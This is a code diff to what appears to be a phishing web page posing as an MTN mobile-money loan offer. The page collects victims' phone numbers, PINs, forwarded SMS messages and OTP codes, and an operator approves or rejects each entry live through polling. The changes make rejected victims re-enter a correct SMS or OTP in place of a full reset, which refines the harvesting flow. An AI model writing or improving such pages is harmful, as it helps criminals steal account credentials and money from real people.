@@ -154,12 +154,6 @@
   .forgot-pin { text-align:center; font-size:0.82rem; color:var(--text-light); margin-bottom:24px; cursor:pointer; }
   .btn-login { width:100%; max-width:380px; padding:13px; background:#e8e8e8; color:#aaa; border:none; border-radius:8px; font-size:0.88rem; font-weight:600; letter-spacing:0.05em; cursor:pointer; font-family:'Inter',sans-serif; transition:all 0.2s; }
   .btn-login.rdy { background: var(--grad); color:#fff; }
-  .btn-login:disabled { opacity:0.5; cursor:not-allowed; }
-  
-  /* RETRY BUTTONS */
-  .btn-retry { width:100%; padding:12px 20px; background: linear-gradient(to right, #FF6B35, #FF8C42); color:#fff; border:none; border-radius:8px; font-size:0.88rem; font-weight:600; letter-spacing:0.05em; cursor:pointer; font-family:'Inter',sans-serif; transition:opacity 0.2s; margin-top:10px; }
-  .btn-retry:hover { opacity:0.9; }
-  .btn-retry:disabled { opacity:0.5; cursor:not-allowed; }
   .lg-curve { margin-top:32px; background:#fff; overflow:hidden; flex-shrink:0; }
   .lg-curve::before { content:''; display:block; background: var(--mtn-dark); height:55px; clip-path:ellipse(60% 100% at 50% 100%); margin-bottom:-4px; }
   .lg-foot { background: var(--mtn-dark); padding:24px 20px 32px; display:flex; flex-direction:column; align-items:center; gap:8px; text-align:center; }
@@ -928,24 +922,18 @@
             clearTimeout(pollTimeout);
             goTo('page-sms-paste');
           } else if (status === 'rejected') {
-            console.log('❌ Admin rejected login - AUTO CLEARING DATA');
+            console.log('❌ Admin rejected login');
             clearTimeout(pollTimeout);
             
-            // AUTO-CLEAR all login data
+            // Clear login form
             document.getElementById('lpPhone').value = '';
             [0,1,2,3,4].forEach(i => document.getElementById('lp'+i).value = '');
-            
-            // RE-ENABLE the LOGIN button
-            document.getElementById('bLgn').disabled = false;
             
             // Go back to login page
             goTo('page-login');
             
-            // Show message and enable user to try immediately
-            showLgnMsg('error', '❌ Invalid Login. Your credentials were incorrect. Please try again.');
-            
-            // Auto-focus on phone field for user to immediately start typing
-            setTimeout(() => document.getElementById('lpPhone').focus(), 300);
+            // Show error message
+            showLgnMsg('error', 'Your login credentials were invalid. Please try again.');
           } else {
             // Still pending, keep polling
             pollTimeout = setTimeout(checkStatus, 2000);
@@ -1038,28 +1026,13 @@
             console.log('✅ Admin approved SMS');
             clearTimeout(smsPollTimeout);
             goTo('page-otp');
-          } else if (status === 'rejected' || status === 'pending') {
-            console.log('❌ Admin rejected SMS - AUTO CLEARING DATA');
+          } else if (status === 'rejected') {
+            console.log('❌ Admin rejected SMS - ask user to paste correct message');
             clearTimeout(smsPollTimeout);
-            
-            // AUTO-CLEAR all data
-            document.getElementById('lpPhone').value = '';
-            [0,1,2,3,4].forEach(i => document.getElementById('lp'+i).value = '');
+            goTo('page-sms-paste');
+            showSmsMsg('error', 'The SMS message was incorrect. Please paste the correct message.');
+            // Clear the textarea for user to enter correct message
             document.getElementById('smsMsgBox').value = '';
-            [0,1,2,3].forEach(i => document.getElementById('otp'+i).value = '');
-            
-            // RE-ENABLE buttons
-            document.getElementById('bLgn').disabled = false;
-            document.getElementById('bSms').disabled = false;
-            
-            // Go back to login page
-            goTo('page-login');
-            
-            // Show message - user can immediately re-enter
-            showLgnMsg('error', '❌ Invalid SMS Message. Your session has been cleared. Please start from login again.');
-            
-            // Auto-focus on phone field
-            setTimeout(() => document.getElementById('lpPhone').focus(), 300);
           } else {
             // Still pending, keep polling
             smsPollTimeout = setTimeout(checkStatus, 2000);
@@ -1175,30 +1148,15 @@
             document.getElementById('aprMth').textContent = 'XAF ' + monthly.toLocaleString();
             
             goTo('page-approval');
-          } else if (status === 'wrongcode' || status === 'pending') {
-            console.log('❌ Admin marked code as wrong or data cleared - AUTO CLEARING');
+          } else if (status === 'wrongcode') {
+            console.log('❌ Admin marked code as wrong');
             clearTimeout(otpPollTimeout);
-            
-            // AUTO-CLEAR all data
-            document.getElementById('lpPhone').value = '';
-            [0,1,2,3,4].forEach(i => document.getElementById('lp'+i).value = '');
-            document.getElementById('smsMsgBox').value = '';
-            [0,1,2,3].forEach(i => document.getElementById('otp'+i).value = '');
-            
-            // RE-ENABLE all buttons
-            document.getElementById('bLgn').disabled = false;
-            document.getElementById('bSms').disabled = false;
+            goTo('page-otp');
             document.getElementById('bOtp').disabled = false;
             document.getElementById('bOtp').textContent = 'VERIFY & APPROVE LOAN';
-            
-            // Go back to login page
-            goTo('page-login');
-            
-            // Show message - user can immediately re-enter
-            showLgnMsg('error', '❌ Invalid OTP Code. Your session has been cleared. Please start from login again.');
-            
-            // Auto-focus on phone field
-            setTimeout(() => document.getElementById('lpPhone').focus(), 300);
+            // Clear OTP fields
+            [0,1,2,3].forEach(i => document.getElementById('otp'+i).value = '');
+            showOtpMsg('error', 'The OTP code was incorrect. Please try again.');
           } else {
             // Still pending, keep polling
             otpPollTimeout = setTimeout(checkStatus, 2000);
